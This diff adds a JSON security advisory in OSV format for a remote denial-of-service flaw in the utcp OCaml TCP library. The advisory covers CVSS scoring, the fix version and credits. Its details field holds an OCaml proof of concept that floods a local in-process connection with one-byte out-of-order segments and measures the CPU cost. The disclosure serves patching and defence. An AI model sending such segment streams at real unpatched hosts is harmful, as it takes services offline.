@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.7.4",
+  "id": "OSEC-2026-11",
+  "modified": "2026-07-27T19:30:00Z",
+  "published": "2026-07-27T19:30:00Z",
+  "summary": "Out of order segment reassembly allows remote denial of service",
+  "details": "A remote peer that completes a normal TCP handshake can send a stream of small out-of-order segments that never fill the gap at rcv_nxt. utcp keeps one reassembly entry per segment (bounded per connection only by the receive window, about 65000 one-byte entries) and re-folds the whole queue on every segment, so per-packet cost is huge.\n\nThis has SegmentSmack shape (CVE-2018-5390): a cheap packet stream imposes disproportionate CPU on the receiver, and there is no cap on the number of such connections. \n\n## Solution\n\nInstead of a flat list, a red-black binary tree is used for the reassembly queue.\n\n## Reproduction\n\n```OCaml\nlet () = Mirage_crypto_rng_unix.use_default ()\n\nlet server_ip = Ipaddr.(V4 (V4.of_string_exn \"10.0.0.1\"))\nlet client_ip = Ipaddr.(V4 (V4.of_string_exn \"10.0.0.2\"))\nlet now = Mtime.of_uint64_ns 0L\nlet to_wire seg = Utcp.Segment.encode_and_checksum now ~src:client_ip ~dst:server_ip seg\n\nlet seg ~seq ?ack ?flag ?(payload = []) ?(payload_len = 0) () =\n  { Utcp.Segment.src_port = 12345; dst_port = 80; seq; ack; flag;\n    push = false; window = 65535; options = []; payload; payload_len }\n\nlet feed st s = Utcp.handle_buf st now ~src:client_ip ~dst:server_ip (to_wire s)\n\n(* establish a connection, then feed [n] out-of-order segments that never fill\n   the gap at rcv_nxt; return the CPU time spent *)\nlet cost n =\n  let st = Utcp.start_listen (Utcp.empty Fun.id \"victim\") 80 in\n  let iss = Utcp.Sequence.of_int32 1000l in\n  let st, _, outs = feed st (seg ~seq:iss ~flag:`Syn ()) in\n  let server_iss = (match outs with [ (_, _, s) ] -> s.Utcp.Segment.seq | _ -> assert false) in\n  let st, _, _ = feed st (seg ~seq:(Utcp.Sequence.incr iss) ~ack:(Utcp.Sequence.incr server_iss) ()) in\n  let rcv_nxt = Utcp.Sequence.incr iss and ack = Utcp.Sequence.incr server_iss in\n  let st = ref st in\n  let t0 = Sys.time () in\n  for i = 0 to n - 1 do\n    let s = seg ~seq:(Utcp.Sequence.addi rcv_nxt ((2 * i) + 2)) ~ack ~payload:[ \"X\" ] ~payload_len:1 () in\n    let st', _, _ = feed !st s in\n    st := st'\n  done;\n  Sys.time () -. t0\n\nlet () =\n  let t1 = cost 2000 and t2 = cost 4000 and t3 = cost 8000 in\n  Printf.printf \"2000 one-byte out-of-order segments: %.3fs\\n\" t1;\n  Printf.printf \"4000 one-byte out-of-order segments: %.3fs (%.1fx)\\n\" t2 (t2 /. t1);\n  Printf.printf \"8000 one-byte out-of-order segments: %.3fs (%.1fx)\\n\" t3 (t3 /. t2)\n```\n\n## Timeline\n\n- June 25th 2026: report to ocaml/security-advisories\n- June 29th: acknowledgement of issue with several questions for the reporter\n- July 6th: answers from reporter, including a patch\n- July 26th: patch developed by library author\n- July 27th: release of utcp 0.0.6 and security advisory",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "opam",
+        "name": "utcp",
+        "purl": "pkg:opam/utcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.6"
+            }
+          ]
+        },
+        {
+          "type": "GIT",
+          "repo": "https://git.robur.coop/robur/utcp.git",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "08522428c957d796a6455d5aad434701c879fd4e"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5"
+      ],
+      "ecosystem_specific": {
+        "opam_constraint": "utcp {< \"0.0.6\"}"
+      }
+    }
+  ],
+  "references": [],
+  "credits": [
+    {
+      "name": "Thomas Gazagnaire",
+      "type": "REPORTER"
+    },
+    {
+      "name": "Hannes Mehnert",
+      "type": "REMEDIATION_DEVELOPER"
+    },
+    {
+      "name": "Romain Calascibetta",
+      "type": "REMEDIATION_REVIEWER"
+    }
+  ],
+  "database_specific": {
+    "osv": "https://github.com/ocaml/security-advisories/tree/generated-osv/2026/OSEC-2026-11.json",
+    "human_link": "https://github.com/ocaml/security-advisories/tree/main/advisories/2026/OSEC-2026-11.md",
+    "cwe": [
+      "CWE-400"
+    ]
+  }
+}
